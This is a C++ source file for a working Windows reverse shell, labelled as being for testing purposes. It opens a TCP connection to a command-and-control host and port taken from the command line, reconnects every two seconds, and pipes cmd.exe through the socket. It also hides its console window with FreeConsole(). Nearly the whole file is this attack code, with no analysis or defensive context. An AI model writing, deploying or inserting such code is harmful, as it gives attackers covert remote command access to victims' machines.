// Creating A reverse Shell on C++ For Testing Purposes.

#include <WinSock2.h>
#include <windows.h>
#include <WS2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024	
//#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#ifdef UNICODE 
#endif
void runshell(char* C2Server, int C2Port) {

	while (true) {
		Sleep(2000);
		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;
		WSAStartup(MAKEWORD(2, 2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);

		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocket(mySocket);
			WSACleanup();
			continue;

		}
		else {
			char Recv_data[DEFAULT_BUFLEN];
			memset(Recv_data, 0, sizeof(Recv_data));
			int Recv_code = recv(mySocket, Recv_data, 1024, 0);
			if (Recv_code <= 0) {
				closesocket(mySocket);
				WSACleanup();
				continue;
			}
			else {
				char Process[] = "cmd.exe";
				//wchar_t wProcess[8];
				//mbstowcs(wProcess, Process, strlen(Process) + 1);
				//LPWSTR Proc = wProcess;
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);

				memset(Recv_data, 0, sizeof(Recv_data));
				int Recv_code = recv(mySocket, Recv_data, 1024, 0);
				if (Recv_code <= 0) {
					closesocket(mySocket);
					WSACleanup();
					continue;
				}
				if (strcmp(Recv_data, "exit\n") == 0) {
					exit(0);
				}
			}
		}


	}

}

int main(int argc, char** argv) {
	FreeConsole();
	if (argc == 3) {
		int port = atoi(argv[2]);
		runshell(argv[1], port);
	}
	else {
		char host[] = "localhost";
		int port = 9110;
		runshell(host, port);

	}
	return 0;
}
